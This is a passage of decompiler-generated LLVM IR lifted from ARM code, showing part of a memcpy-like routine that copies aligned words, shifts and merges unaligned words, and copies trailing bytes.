  %v4_18978 = and i32 %v1_18978, %v3_18978
  %v5_18978 = icmp slt i32 %v4_18978, 0
  store i1 %v5_18978, i1* %cpsr_v.global-to-local, align 1
  %v6_18978 = icmp slt i32 %v1_18978, 0
  store i1 %v6_18978, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_1897c

dec_label_pc_1897c:                               ; preds = %.thread118, %dec_label_pc_18978
  %v0_1898c.pre149 = phi i32 [ %v0_1898c.pre, %.thread118 ], [ %v1_18978, %dec_label_pc_18978 ]
  %v3_18980 = phi i32 [ %v3_1898099119, %.thread118 ], [ %v3_18980101, %dec_label_pc_18978 ]
  %v1_18984 = phi i1 [ %v1_18988, %.thread118 ], [ %v5_18978, %dec_label_pc_18978 ]
  %v0_18984 = phi i1 [ %v0_18988, %.thread118 ], [ %v6_18978, %dec_label_pc_18978 ]
  %v2_1897c = xor i1 %v1_18984, %v0_18984
  br i1 %v2_1897c, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_1897c
  %v3_1897c = load i32, i32* @r1, align 4
  %v4_1897c = inttoptr i32 %v3_1897c to i32*
  %v5_1897c = load i32, i32* %v4_1897c, align 4
  store i32 %v5_1897c, i32* %r3.global-to-local, align 4
  %v6_1897c = add i32 %v3_1897c, 4
  %v7_1897c = inttoptr i32 %v6_1897c to i32*
  %v8_1897c = load i32, i32* %v7_1897c, align 4
  store i32 %v8_1897c, i32* @ip, align 4
  %v9_1897c = add i32 %v3_1897c, 8
  %v10_1897c = inttoptr i32 %v9_1897c to i32*
  %v11_1897c = load i32, i32* %v10_1897c, align 4
  store i32 %v11_1897c, i32* @lr, align 4
  %v12_1897c = add i32 %v3_1897c, 12
  store i32 %v12_1897c, i32* @r1, align 4
  %v4_18980 = inttoptr i32 %v3_18980 to i32*
  store i32 %v5_1897c, i32* %v4_18980, align 4
  %v6_18980 = add i32 %v3_18980, 4
  %v7_18980 = inttoptr i32 %v6_18980 to i32*
  %v8_18980 = load i32, i32* @ip, align 4
  store i32 %v8_18980, i32* %v7_18980, align 4
  %v9_18980 = add i32 %v3_18980, 8
  %v10_18980 = inttoptr i32 %v9_18980 to i32*
  %v11_18980 = load i32, i32* @lr, align 4
  store i32 %v11_18980, i32* %v10_18980, align 4
  %v12_18980 = add i32 %v3_18980, 12
  store i32 %v12_18980, i32* %r0.global-to-local, align 4
  %v3_18984 = load i32, i32* %r2.global-to-local, align 4
  %v4_18984 = add i32 %v3_18984, -12
  store i32 %v4_18984, i32* %r2.global-to-local, align 4
  %v6_18984 = sub i32 11, %v3_18984
  %v7_18984 = and i32 %v6_18984, %v3_18984
  %v8_18984 = icmp slt i32 %v7_18984, 0
  store i1 %v8_18984, i1* %cpsr_v.global-to-local, align 1
  %v9_18984 = icmp slt i32 %v4_18984, 0
  store i1 %v9_18984, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_1897c, %bb131
  %v0_1898c.pre = phi i32 [ %v4_18984, %bb131 ], [ %v0_1898c.pre149, %dec_label_pc_1897c ]
  %v3_1898099119 = phi i32 [ %v12_18980, %bb131 ], [ %v3_18980, %dec_label_pc_1897c ]
  %v1_18988 = phi i1 [ %v8_18984, %bb131 ], [ %v1_18984, %dec_label_pc_1897c ]
  %v0_18988 = phi i1 [ %v9_18984, %bb131 ], [ %v0_18984, %dec_label_pc_1897c ]
  %v2_18988 = xor i1 %v1_18988, %v0_18988
  br i1 %v2_18988, label %dec_label_pc_1898c, label %dec_label_pc_1897c

dec_label_pc_1898c:                               ; preds = %.thread118, %dec_label_pc_18938
  %v7_1899c = phi i32 [ %v0_1895093, %dec_label_pc_18938 ], [ %v3_1898099119, %.thread118 ]
  %v0_1898c = phi i32 [ %v2_18938, %dec_label_pc_18938 ], [ %v0_1898c.pre, %.thread118 ]
  %v2_1898c = add i32 %v0_1898c, 8
  store i32 %v2_1898c, i32* %r2.global-to-local, align 4
  %v4_1898c = sub i32 0, %v0_1898c
  %v5_1898c = and i32 %v2_1898c, %v4_1898c
  %v6_1898c = icmp slt i32 %v5_1898c, 0
  store i1 %v6_1898c, i1* %cpsr_v.global-to-local, align 1
  %v7_1898c = icmp slt i32 %v2_1898c, 0
  store i1 %v7_1898c, i1* %cpsr_n.global-to-local, align 1
  %v5_18990 = icmp slt i32 %v0_1898c, -8
  br i1 %v5_18990, label %bb133, label %dec_label_pc_18994

dec_label_pc_18994:                               ; preds = %dec_label_pc_1898c
  %v6_18994 = add i32 %v0_1898c, 4
  store i32 %v6_18994, i32* %r2.global-to-local, align 4
  %v8_18994 = sub i32 -5, %v0_1898c
  %v9_18994 = and i32 %v8_18994, %v2_1898c
  %v10_18994 = icmp slt i32 %v9_18994, 0
  store i1 %v10_18994, i1* %cpsr_v.global-to-local, align 1
  %v11_18994 = icmp slt i32 %v6_18994, 0
  store i1 %v11_18994, i1* %cpsr_n.global-to-local, align 1
  %v5_18998 = icmp slt i32 %v2_1898c, 4
  %v6_18998 = load i32, i32* @r1, align 4
  %v7_18998 = inttoptr i32 %v6_18998 to i32*
  %v8_18998 = load i32, i32* %v7_18998, align 4
  store i32 %v8_18998, i32* %r3.global-to-local, align 4
  %v10_18998 = add i32 %v6_18998, 4
  br i1 %v5_18998, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_18994
  store i32 %v10_18998, i32* @r1, align 4
  %v8_1899c = inttoptr i32 %v7_1899c to i32*
  store i32 %v8_18998, i32* %v8_1899c, align 4
  %v9_1899c = load i32, i32* %r0.global-to-local, align 4
  %v10_1899c = add i32 %v9_1899c, 4
  store i32 %v10_1899c, i32* %r0.global-to-local, align 4
  %v0_189ac.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_18994
  %v10_189a0 = inttoptr i32 %v10_18998 to i32*
  %v11_189a0 = load i32, i32* %v10_189a0, align 4
  store i32 %v11_189a0, i32* @ip, align 4
  %v12_189a0 = add i32 %v6_18998, 8
  store i32 %v12_189a0, i32* @r1, align 4
  %v7_189a4 = inttoptr i32 %v7_1899c to i32*
  store i32 %v8_18998, i32* %v7_189a4, align 4
  %v9_189a4 = add i32 %v7_1899c, 4
  %v10_189a4 = inttoptr i32 %v9_189a4 to i32*
  %v11_189a4 = load i32, i32* @ip, align 4
  store i32 %v11_189a4, i32* %v10_189a4, align 4
  %v12_189a4 = add i32 %v7_1899c, 8
  store i32 %v12_189a4, i32* %r0.global-to-local, align 4
  %v6_189a8 = load i32, i32* %r2.global-to-local, align 4
  %v7_189a8 = add i32 %v6_189a8, -4
  store i32 %v7_189a8, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_1898c, %bb, %dec_label_pc_18b54, %dec_label_pc_18a7c, %dec_label_pc_18ae8, %bb132
  %v2_189bc = phi i32 [ %v10_1899c, %.thread6 ], [ %v0_18a4c76, %.thread12 ], [ %v7_1899c, %dec_label_pc_1898c ], [ %v1_18910, %bb ], [ %v2_189bc114, %dec_label_pc_18b54 ], [ %v2_189bc113, %dec_label_pc_18a7c ], [ %v2_189bc112, %dec_label_pc_18ae8 ], [ %v12_189a4, %bb132 ]
  %v0_189ac = phi i32 [ %v0_189ac.pre, %.thread6 ], [ %v2_189f4, %.thread12 ], [ %v2_1898c, %dec_label_pc_1898c ], [ %v2_18920, %bb ], [ %v0_189ac110, %dec_label_pc_18b54 ], [ %v0_189ac109, %dec_label_pc_18a7c ], [ %v0_189ac108, %dec_label_pc_18ae8 ], [ %v7_189a8, %bb132 ]
  %v1_189ac = add i32 %v0_189ac, 4
  store i32 %v1_189ac, i32* @r2, align 4
  %v3_189ac = sub i32 0, %v0_189ac
  %v4_189ac = and i32 %v1_189ac, %v3_189ac
  %v5_189ac = icmp slt i32 %v4_189ac, 0
  store i1 %v5_189ac, i1* %cpsr_v.global-to-local, align 1
  %v6_189ac = icmp slt i32 %v1_189ac, 0
  store i1 %v6_189ac, i1* %cpsr_n.global-to-local, align 1
  %v7_189ac = icmp eq i32 %v1_189ac, 0
  store i1 %v7_189ac, i1* @cpsr_z, align 1
  br i1 %v7_189ac, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_189b0 = load i8*, i8** %stack_var_-8, align 4
  %v4_189b0 = ptrtoint i8* %v3_189b0 to i32
  store i32 %v4_189b0, i32* %r0.global-to-local, align 4
  ret i32 %v4_189b0

bb135:                                            ; preds = %bb133
  %v1_189b4 = add i32 %v0_189ac, 2
  %v3_189b4 = sub i32 -3, %v0_189ac
  %v4_189b4 = and i32 %v3_189b4, %v1_189ac
  %v5_189b4 = icmp slt i32 %v4_189b4, 0
  store i1 %v5_189b4, i1* %cpsr_v.global-to-local, align 1
  %v6_189b4 = icmp slt i32 %v1_189b4, 0
  store i1 %v6_189b4, i1* %cpsr_n.global-to-local, align 1
  %v7_189b4 = icmp eq i32 %v1_189ac, 2
  store i1 %v7_189b4, i1* @cpsr_z, align 1
  %v0_189b8 = load i32, i32* @r1, align 4
  %v1_189b8 = inttoptr i32 %v0_189b8 to i8*
  %v2_189b8 = load i8, i8* %v1_189b8, align 1
  %v3_189b8 = zext i8 %v2_189b8 to i32
  store i32 %v3_189b8, i32* %r3.global-to-local, align 4
  %v5_189b8 = add i32 %v0_189b8, 1
  store i32 %v5_189b8, i32* @r1, align 4
  %v3_189bc = inttoptr i32 %v2_189bc to i8*
  store i8 %v2_189b8, i8* %v3_189bc, align 1
  %v4_189bc = load i32, i32* %r0.global-to-local, align 4
  %v5_189bc = add i32 %v4_189bc, 1
  store i32 %v5_189bc, i32* %r0.global-to-local, align 4
  %v0_189c0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_189c0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_189c0 = xor i1 %v0_189c0, %v1_189c0
  br i1 %v2_189c0, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_189c0 = load i32, i32* @r1, align 4
  %v4_189c0 = inttoptr i32 %v3_189c0 to i8*
  %v5_189c0 = load i8, i8* %v4_189c0, align 1
  %v6_189c0 = zext i8 %v5_189c0 to i32
  store i32 %v6_189c0, i32* %r3.global-to-local, align 4
  %v8_189c0 = add i32 %v3_189c0, 1
  store i32 %v8_189c0, i32* @r1, align 4
  %v6_189c4 = inttoptr i32 %v5_189bc to i8*
  store i8 %v5_189c0, i8* %v6_189c4, align 1
  %v7_189c4 = load i32, i32* %r0.global-to-local, align 4
  %v8_189c4 = add i32 %v7_189c4, 1
  store i32 %v8_189c4, i32* %r0.global-to-local, align 4
  %v1_189c8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_189c8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_189cc = phi i32 [ %v8_189c4, %bb136 ], [ %v5_189bc, %bb135 ]
  %v2_189cc = phi i1 [ %v2_189c8.pre, %bb136 ], [ %v1_189c0, %bb135 ]
  %v1_189cc = phi i1 [ %v1_189c8.pre, %bb136 ], [ %v0_189c0, %bb135 ]
  %v0_189c8 = load i1, i1* @cpsr_z, align 1
  %v3_189c8 = xor i1 %v2_189cc, %v1_189cc
  %v4_189c8 = or i1 %v0_189c8, %v3_189c8
  br i1 %v4_189c8, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_189c8 = load i32, i32* @r1, align 4
  %v6_189c8 = inttoptr i32 %v5_189c8 to i8*
  %v7_189c8 = load i8, i8* %v6_189c8, align 1
  %v8_189c8 = zext i8 %v7_189c8 to i32
  store i32 %v8_189c8, i32* %r3.global-to-local, align 4
  %v10_189c8 = add i32 %v5_189c8, 1
  store i32 %v10_189c8, i32* @r1, align 4
  %v8_189cc = inttoptr i32 %v7_189cc to i8*
  store i8 %v7_189c8, i8* %v8_189cc, align 1
  %v9_189cc = load i32, i32* %r0.global-to-local, align 4
  %v10_189cc = add i32 %v9_189cc, 1
  store i32 %v10_189cc, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_189d0 = load i8*, i8** %stack_var_-8, align 4
  %v3_189d0 = ptrtoint i8* %v2_189d0 to i32
  store i32 %v3_189d0, i32* %r0.global-to-local, align 4
  ret i32 %v3_189d0

dec_label_pc_189d4:                               ; preds = %dec_label_pc_18928
  %v1_189d4 = sub nsw i32 4, %v1_18928
  store i32 %v1_189d4, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_189d8 = icmp ult i32 %v1_189d4, 2
  store i1 %v8_189d8, i1* %cpsr_n.global-to-local, align 1
  %v1_189dc = inttoptr i32 %v0_18910 to i8*
  %v2_189dc = load i8, i8* %v1_189dc, align 1
  %v3_189dc = zext i8 %v2_189dc to i32
  store i32 %v3_189dc, i32* %r3.global-to-local, align 4
  %v5_189dc = add i32 %v0_18910, 1
  store i32 %v5_189dc, i32* @r1, align 4
  store i8 %v2_189dc, i8* %v5_1891c, align 1
  %v4_189e0 = load i32, i32* %r0.global-to-local, align 4
  %v5_189e0 = add i32 %v4_189e0, 1
  store i32 %v5_189e0, i32* %r0.global-to-local, align 4
  br i1 %v8_189d8, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_189d4
  %v9_189d8 = icmp eq i32 %v1_189d4, 2
  %v6_189e4 = load i32, i32* @r1, align 4
  %v7_189e4 = inttoptr i32 %v6_189e4 to i8*
  %v8_189e4 = load i8, i8* %v7_189e4, align 1
  %v9_189e4 = zext i8 %v8_189e4 to i32
  store i32 %v9_189e4, i32* %r3.global-to-local, align 4
  %v11_189e4 = add i32 %v6_189e4, 1
  store i32 %v11_189e4, i32* @r1, align 4
  %v9_189e8 = inttoptr i32 %v5_189e0 to i8*
  store i8 %v8_189e4, i8* %v9_189e8, align 1
  %v10_189e8 = load i32, i32* %r0.global-to-local, align 4
  %v11_189e8 = add i32 %v10_189e8, 1
  store i32 %v11_189e8, i32* %r0.global-to-local, align 4
  br i1 %v9_189d8, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_189ec = load i32, i32* @r1, align 4
  %v9_189ec = inttoptr i32 %v8_189ec to i8*
  %v10_189ec = load i8, i8* %v9_189ec, align 1
  %v11_189ec = zext i8 %v10_189ec to i32
  store i32 %v11_189ec, i32* %r3.global-to-local, align 4
  %v13_189ec = add i32 %v8_189ec, 1
  store i32 %v13_189ec, i32* @r1, align 4
  %v11_189f0 = inttoptr i32 %v11_189e8 to i8*
  store i8 %v10_189ec, i8* %v11_189f0, align 1
  %v12_189f0 = load i32, i32* %r0.global-to-local, align 4
  %v13_189f0 = add i32 %v12_189f0, 1
  store i32 %v13_189f0, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_189d4, %bb139
  %v0_18a4c76 = phi i32 [ %v11_189e8, %bb138 ], [ %v5_189e0, %dec_label_pc_189d4 ], [ %v13_189f0, %bb139 ]
  %v0_189f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_189f4 = load i32, i32* @ip, align 4
  %v2_189f4 = sub i32 %v0_189f4, %v1_189f4
  store i32 %v2_189f4, i32* %r2.global-to-local, align 4
  %v4_189f4 = xor i32 %v1_189f4, %v0_189f4
  %v5_189f4 = xor i32 %v2_189f4, %v0_189f4
  %v6_189f4 = and i32 %v5_189f4, %v4_189f4
  %v7_189f4 = icmp slt i32 %v6_189f4, 0
  store i1 %v7_189f4, i1* %cpsr_v.global-to-local, align 1
  %v8_189f4 = icmp slt i32 %v2_189f4, 0
  store i1 %v8_189f4, i1* %cpsr_n.global-to-local, align 1
  %v5_189f8 = icmp slt i32 %v0_189f4, %v1_189f4
  br i1 %v5_189f8, label %bb133, label %dec_label_pc_189fc

dec_label_pc_189fc:                               ; preds = %.thread12
  %v0_189fc = load i32, i32* @r1, align 4
  %v1_189fc = urem i32 %v0_189fc, 4
  store i32 %v1_189fc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_189fc = icmp eq i32 %v1_189fc, 0
  %extract.t124 = trunc i32 %v0_189fc to i2
  br i1 %v2_189fc, label %dec_label_pc_18938, label %dec_label_pc_18a04

dec_label_pc_18a04:                               ; preds = %dec_label_pc_18930, %dec_label_pc_189fc
  %v0_18a4c75 = phi i32 [ %v1_18910, %dec_label_pc_18930 ], [ %v0_18a4c76, %dec_label_pc_189fc ]
  %v0_18af8 = phi i32 [ %v2_18920, %dec_label_pc_18930 ], [ %v2_189f4, %dec_label_pc_189fc ]
  %v0_18a0c.off0 = phi i2 [ %extract.t, %dec_label_pc_18930 ], [ %extract.t124, %dec_label_pc_189fc ]
  %v0_18a04 = phi i32 [ %v0_18910, %dec_label_pc_18930 ], [ %v0_189fc, %dec_label_pc_189fc ]
  %v1_18a04 = and i32 %v0_18a04, -4
  store i32 %v1_18a04, i32* %r1.global-to-local, align 4
  %v1_18a08 = inttoptr i32 %v1_18a04 to i32*
  %v2_18a08 = load i32, i32* %v1_18a08, align 4
  store i32 %v2_18a08, i32* @lr, align 4
  %v4_18a08 = add i32 %v1_18a04, 4
  store i32 %v4_18a08, i32* %r1.global-to-local, align 4
  %v2_18af0 = add i32 %v0_18af8, -12
  %v4_18af0 = sub i32 11, %v0_18af8
  %v5_18af0 = and i32 %v4_18af0, %v0_18af8
  %v6_18af0 = icmp slt i32 %v5_18af0, 0
  store i1 %v6_18af0, i1* %cpsr_v.global-to-local, align 1
  %v7_18af0 = icmp slt i32 %v2_18af0, 0
  store i1 %v7_18af0, i1* %cpsr_n.global-to-local, align 1
  %v5_18af4 = icmp slt i32 %v0_18af8, 12
  switch i2 %v0_18a0c.off0, label %dec_label_pc_18a18 [
    i2 -1, label %dec_label_pc_18af0
    i2 -2, label %dec_label_pc_18a84
  ]

dec_label_pc_18a18:                               ; preds = %dec_label_pc_18a04
  br i1 %v5_18af4, label %dec_label_pc_18a64, label %dec_label_pc_18a20

dec_label_pc_18a20:                               ; preds = %dec_label_pc_18a18
  store i32 %v2_18af0, i32* %r2.global-to-local, align 4
  %v3_18a24 = load i32, i32* @r4, align 4
  store i32 %v3_18a24, i32* %stack_var_-16, align 4
  %v6_18a24 = load i32, i32* @r5, align 4
  store i32 %v6_18a24, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18a28

dec_label_pc_18a28:                               ; preds = %dec_label_pc_18a28.dec_label_pc_18a28_crit_edge, %dec_label_pc_18a20
  %v0_18a4c = phi i32 [ %v12_18a4c, %dec_label_pc_18a28.dec_label_pc_18a28_crit_edge ], [ %v0_18a4c75, %dec_label_pc_18a20 ]
  %v0_18a2c = phi i32 [ %v0_18a2c.pre, %dec_label_pc_18a28.dec_label_pc_18a28_crit_edge ], [ %v4_18a08, %dec_label_pc_18a20 ]
  %v0_18a28 = phi i32 [ %v0_18a28.pre, %dec_label_pc_18a28.dec_label_pc_18a28_crit_edge ], [ %v2_18a08, %dec_label_pc_18a20 ]
  %v3_18a28 = udiv i32 %v0_18a28, 256
  store i32 %v3_18a28, i32* %r3.global-to-local, align 4
  %v1_18a2c = inttoptr i32 %v0_18a2c to i32*
  %v2_18a2c = load i32, i32* %v1_18a2c, align 4
  store i32 %v2_18a2c, i32* %r4.global-to-local, align 4
  %v3_18a2c = add i32 %v0_18a2c, 4
  %v4_18a2c = inttoptr i32 %v3_18a2c to i32*
  %v5_18a2c = load i32, i32* %v4_18a2c, align 4
  store i32 %v5_18a2c, i32* %r5.global-to-local, align 4
  %v6_18a2c = add i32 %v0_18a2c, 8
  %v7_18a2c = inttoptr i32 %v6_18a2c to i32*
  %v8_18a2c = load i32, i32* %v7_18a2c, align 4
  store i32 %v8_18a2c, i32* %ip.global-to-local, align 4
  %v9_18a2c = add i32 %v0_18a2c, 12
  %v10_18a2c = inttoptr i32 %v9_18a2c to i32*
  %v11_18a2c = load i32, i32* %v10_18a2c, align 4
  store i32 %v11_18a2c, i32* @lr, align 4
  %v12_18a2c = add i32 %v0_18a2c, 16
  store i32 %v12_18a2c, i32* %r1.global-to-local, align 4
  %v4_18a30 = mul i32 %v2_18a2c, 16777216
  %v5_18a30 = or i32 %v4_18a30, %v3_18a28
  store i32 %v5_18a30, i32* %r3.global-to-local, align 4
  %v3_18a34 = udiv i32 %v2_18a2c, 256
  %v4_18a38 = mul i32 %v5_18a2c, 16777216
  %v5_18a38 = or i32 %v4_18a38, %v3_18a34
  store i32 %v5_18a38, i32* %r4.global-to-local, align 4
  %v3_18a3c = udiv i32 %v5_18a2c, 256
  %v4_18a40 = mul i32 %v8_18a2c, 16777216
  %v5_18a40 = or i32 %v4_18a40, %v3_18a3c
  store i32 %v5_18a40, i32* %r5.global-to-local, align 4
  %v3_18a44 = udiv i32 %v8_18a2c, 256
  %v4_18a48 = mul i32 %v11_18a2c, 16777216
  %v5_18a48 = or i32 %v4_18a48, %v3_18a44
  store i32 %v5_18a48, i32* @ip, align 4
  %v1_18a4c = inttoptr i32 %v0_18a4c to i32*
  store i32 %v5_18a30, i32* %v1_18a4c, align 4
  %v3_18a4c = add i32 %v0_18a4c, 4
  %v4_18a4c = inttoptr i32 %v3_18a4c to i32*
  %v5_18a4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18a4c, i32* %v4_18a4c, align 4
  %v6_18a4c = add i32 %v0_18a4c, 8
  %v7_18a4c = inttoptr i32 %v6_18a4c to i32*
  %v8_18a4c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18a4c, i32* %v7_18a4c, align 4
  %v9_18a4c = add i32 %v0_18a4c, 12
  %v10_18a4c = inttoptr i32 %v9_18a4c to i32*
  %v11_18a4c = load i32, i32* @ip, align 4
  store i32 %v11_18a4c, i32* %v10_18a4c, align 4
  %v12_18a4c = add i32 %v0_18a4c, 16
  store i32 %v12_18a4c, i32* %r0.global-to-local, align 4
  %v0_18a50 = load i32, i32* %r2.global-to-local, align 4
  %v2_18a50 = add i32 %v0_18a50, -16
  store i32 %v2_18a50, i32* %r2.global-to-local, align 4
  %v6_18a54 = icmp slt i32 %v0_18a50, 16
  br i1 %v6_18a54, label %dec_label_pc_18a58, label %dec_label_pc_18a28.dec_label_pc_18a28_crit_edge

dec_label_pc_18a28.dec_label_pc_18a28_crit_edge:  ; preds = %dec_label_pc_18a28
  %v0_18a28.pre = load i32, i32* @lr, align 4
  %v0_18a2c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18a28

dec_label_pc_18a58:                               ; preds = %dec_label_pc_18a28
  %v2_18a58 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18a58, i32* @r4, align 4
  %v5_18a58 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18a58, i32* @r5, align 4
  %v2_18a5c = add i32 %v0_18a50, -4
  store i32 %v2_18a5c, i32* %r2.global-to-local, align 4
  %v4_18a5c = add i32 %v0_18a50, 2147483632
  %v5_18a5c = and i32 %v2_18a5c, %v4_18a5c
  %v6_18a5c = icmp slt i32 %v5_18a5c, 0
  store i1 %v6_18a5c, i1* %cpsr_v.global-to-local, align 1
  %v7_18a5c = icmp slt i32 %v2_18a5c, 0
  store i1 %v7_18a5c, i1* %cpsr_n.global-to-local, align 1
  %v5_18a60 = icmp slt i32 %v2_18a50, -12
  br i1 %v5_18a60, label %dec_label_pc_18a7c, label %dec_label_pc_18a64

dec_label_pc_18a64:                               ; preds = %dec_label_pc_18a58, %dec_label_pc_18a18, %dec_label_pc_18a64
  %v1_18a70 = phi i32 [ %v4_18a70, %dec_label_pc_18a64 ], [ %v12_18a4c, %dec_label_pc_18a58 ], [ %v0_18a4c75, %dec_label_pc_18a18 ]
  %v0_18a64 = load i32, i32* @lr, align 4
  %v3_18a64 = udiv i32 %v0_18a64, 256
  store i32 %v3_18a64, i32* %ip.global-to-local, align 4
  %v0_18a68 = load i32, i32* %r1.global-to-local, align 4
  %v1_18a68 = inttoptr i32 %v0_18a68 to i32*
  %v2_18a68 = load i32, i32* %v1_18a68, align 4
  store i32 %v2_18a68, i32* @lr, align 4
  %v4_18a68 = add i32 %v0_18a68, 4
  store i32 %v4_18a68, i32* %r1.global-to-local, align 4
  %v4_18a6c = mul i32 %v2_18a68, 16777216
  %v5_18a6c = or i32 %v4_18a6c, %v3_18a64
  store i32 %v5_18a6c, i32* @ip, align 4
  %v2_18a70 = inttoptr i32 %v1_18a70 to i32*
  store i32 %v5_18a6c, i32* %v2_18a70, align 4
  %v3_18a70 = load i32, i32* %r0.global-to-local, align 4
  %v4_18a70 = add i32 %v3_18a70, 4
  store i32 %v4_18a70, i32* %r0.global-to-local, align 4
  %v0_18a74 = load i32, i32* %r2.global-to-local, align 4
  %v2_18a74 = add i32 %v0_18a74, -4
  store i32 %v2_18a74, i32* %r2.global-to-local, align 4
  %v6_18a78 = icmp slt i32 %v0_18a74, 4
  br i1 %v6_18a78, label %dec_label_pc_18a7c.loopexit, label %dec_label_pc_18a64

dec_label_pc_18a7c.loopexit:                      ; preds = %dec_label_pc_18a64
  %v4_18a74 = sub i32 3, %v0_18a74
  %v5_18a74 = and i32 %v4_18a74, %v0_18a74
  %v6_18a74 = icmp slt i32 %v5_18a74, 0
  %v7_18a74 = icmp slt i32 %v2_18a74, 0
  store i1 %v6_18a74, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18a74, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18a7c

dec_label_pc_18a7c:                               ; preds = %dec_label_pc_18a7c.loopexit, %dec_label_pc_18a58
  %v2_189bc113 = phi i32 [ %v4_18a70, %dec_label_pc_18a7c.loopexit ], [ %v12_18a4c, %dec_label_pc_18a58 ]
  %v0_189ac109 = phi i32 [ %v2_18a74, %dec_label_pc_18a7c.loopexit ], [ %v2_18a5c, %dec_label_pc_18a58 ]
  %v0_18a7c = load i32, i32* %r1.global-to-local, align 4
  %v1_18a7c = add i32 %v0_18a7c, -3
  store i32 %v1_18a7c, i32* @r1, align 4
  br label %bb133

dec_label_pc_18a84:                               ; preds = %dec_label_pc_18a04
  br i1 %v5_18af4, label %dec_label_pc_18ad0, label %dec_label_pc_18a8c

dec_label_pc_18a8c:                               ; preds = %dec_label_pc_18a84
  store i32 %v2_18af0, i32* %r2.global-to-local, align 4
  %v3_18a90 = load i32, i32* @r4, align 4
  store i32 %v3_18a90, i32* %stack_var_-16, align 4
  %v6_18a90 = load i32, i32* @r5, align 4
  store i32 %v6_18a90, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18a94

dec_label_pc_18a94:                               ; preds = %dec_label_pc_18a94.dec_label_pc_18a94_crit_edge, %dec_label_pc_18a8c
  %v0_18ab8 = phi i32 [ %v12_18ab8, %dec_label_pc_18a94.dec_label_pc_18a94_crit_edge ], [ %v0_18a4c75, %dec_label_pc_18a8c ]
  %v0_18a98 = phi i32 [ %v0_18a98.pre, %dec_label_pc_18a94.dec_label_pc_18a94_crit_edge ], [ %v4_18a08, %dec_label_pc_18a8c ]
  %v0_18a94 = phi i32 [ %v0_18a94.pre, %dec_label_pc_18a94.dec_label_pc_18a94_crit_edge ], [ %v2_18a08, %dec_label_pc_18a8c ]
  %v3_18a94 = udiv i32 %v0_18a94, 65536
  store i32 %v3_18a94, i32* %r3.global-to-local, align 4
  %v1_18a98 = inttoptr i32 %v0_18a98 to i32*
  %v2_18a98 = load i32, i32* %v1_18a98, align 4
  store i32 %v2_18a98, i32* %r4.global-to-local, align 4
  %v3_18a98 = add i32 %v0_18a98, 4
  %v4_18a98 = inttoptr i32 %v3_18a98 to i32*
  %v5_18a98 = load i32, i32* %v4_18a98, align 4
  store i32 %v5_18a98, i32* %r5.global-to-local, align 4
  %v6_18a98 = add i32 %v0_18a98, 8
  %v7_18a98 = inttoptr i32 %v6_18a98 to i32*
  %v8_18a98 = load i32, i32* %v7_18a98, align 4
  store i32 %v8_18a98, i32* %ip.global-to-local, align 4
  %v9_18a98 = add i32 %v0_18a98, 12
  %v10_18a98 = inttoptr i32 %v9_18a98 to i32*
  %v11_18a98 = load i32, i32* %v10_18a98, align 4
  store i32 %v11_18a98, i32* @lr, align 4
  %v12_18a98 = add i32 %v0_18a98, 16
  store i32 %v12_18a98, i32* %r1.global-to-local, align 4
  %v4_18a9c = mul i32 %v2_18a98, 65536
  %v5_18a9c = or i32 %v4_18a9c, %v3_18a94
  store i32 %v5_18a9c, i32* %r3.global-to-local, align 4
  %v3_18aa0 = udiv i32 %v2_18a98, 65536
  %v4_18aa4 = mul i32 %v5_18a98, 65536
  %v5_18aa4 = or i32 %v4_18aa4, %v3_18aa0
  store i32 %v5_18aa4, i32* %r4.global-to-local, align 4
  %v3_18aa8 = udiv i32 %v5_18a98, 65536
  %v4_18aac = mul i32 %v8_18a98, 65536
  %v5_18aac = or i32 %v4_18aac, %v3_18aa8
  store i32 %v5_18aac, i32* %r5.global-to-local, align 4
  %v3_18ab0 = udiv i32 %v8_18a98, 65536
  %v4_18ab4 = mul i32 %v11_18a98, 65536
  %v5_18ab4 = or i32 %v4_18ab4, %v3_18ab0
  store i32 %v5_18ab4, i32* @ip, align 4
  %v1_18ab8 = inttoptr i32 %v0_18ab8 to i32*
  store i32 %v5_18a9c, i32* %v1_18ab8, align 4
  %v3_18ab8 = add i32 %v0_18ab8, 4
  %v4_18ab8 = inttoptr i32 %v3_18ab8 to i32*
  %v5_18ab8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18ab8, i32* %v4_18ab8, align 4
  %v6_18ab8 = add i32 %v0_18ab8, 8
  %v7_18ab8 = inttoptr i32 %v6_18ab8 to i32*
  %v8_18ab8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18ab8, i32* %v7_18ab8, align 4
